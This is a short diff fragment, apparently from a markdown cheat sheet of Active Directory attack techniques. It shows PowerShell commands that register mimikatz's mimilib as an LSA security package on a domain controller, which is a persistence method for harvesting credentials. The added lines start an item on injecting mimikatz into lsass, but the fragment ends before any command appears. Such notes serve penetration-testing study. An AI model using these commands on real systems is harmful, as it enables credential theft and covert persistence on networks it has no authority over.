@@ -349,3 +349,7 @@ $ ls \\dcorp-dc\C$
 $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' $packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
 'Security Packages' -Value $packages
 ```
+
+
+- Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):
+
